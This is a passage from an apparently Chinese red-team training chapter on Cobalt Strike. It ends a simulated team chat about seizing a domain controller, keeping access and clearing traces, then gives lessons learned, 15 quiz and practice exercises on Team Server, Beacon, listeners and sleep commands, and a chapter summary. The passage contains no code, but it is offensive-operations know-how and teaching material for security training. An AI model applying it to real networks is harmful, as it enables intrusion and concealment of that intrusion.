[14:00] redteam_B: 报告，已经拿下域控了！
[14:01] 队长: 漂亮！做一下权限维持，然后清理痕迹
[14:02] redteam_B: 收到
```

**第五步：收尾工作**

```
[16:00] 队长: 大家都撤回来，清理痕迹
[16:01] 队长: 今天收获很大，辛苦了
[16:02] redteam_A: 辛苦
[16:02] redteam_B: 辛苦
```

### 经验总结
1. CS的团队协作功能很强大
2. 明确的分工很重要
3. 实时沟通能提高效率
4. 操作记录都在日志里，便于复盘
5. 团队作战比单打独斗效率高很多

---

## ✏️ 习题（15道）

### 一、选择题（5题）

1. Cobalt Strike的核心服务端叫做什么？
   - A. Beacon
   - B. Team Server
   - C. Listener
   - D. Client

2. Beacon默认的通信模式是？
   - A. 交互模式
   - B. 异步模式
   - C. 实时模式
   - D. 连续模式

3. 以下哪个不是Beacon的通信协议？
   - A. HTTP
   - B. DNS
   - C. SMB
   - D. ICMP

4. Cobalt Strike使用的脚本语言叫什么？
   - A. PowerShell
   - B. Python
   - C. Aggressor Script
   - D. Lua

5. Team Server默认监听的客户端连接端口是？
   - A. 80
   - B. 443
   - C. 50050
   - D. 3389

### 二、填空题（5题）

6. Cobalt Strike的Payload叫做__________。

7. Beacon设置睡眠时间的命令是__________。

8. CS中用于接收Beacon回连的组件叫做__________。

9. 通过Web分发Payload的功能叫做__________。

10. Beacon切换到交互模式可以用命令 sleep __________。

### 三、简答题（3题）

11. 简述Cobalt Strike的架构和工作原理。

12. Beacon有哪些通信协议？各有什么特点？

13. 异步模式和交互模式有什么区别？各适用于什么场景？

### 四、实操题（2题）

14. 搭建一个Cobalt Strike团队服务器，并用客户端连接成功。

15. 生成一个HTTP Beacon，在测试机器上运行并成功上线，练习常用命令。

---

::: tip 本章小结
这一章我们学习了Cobalt Strike的基础。

主要内容：
1. CS简介和架构
2. 团队服务器搭建
3. 客户端使用入门
4. Beacon原理和通信机制
5. Payload生成方法
6. 监听器配置
7. Beacon交互模式
8. 团队协作功能

CS是红队的核心工具，
一定要熟练掌握。

下一章我们会学习
CS的进阶功能，
包括提权、凭据获取、
横向移动、钓鱼攻击、
脚本编写等。

继续加油！
:::
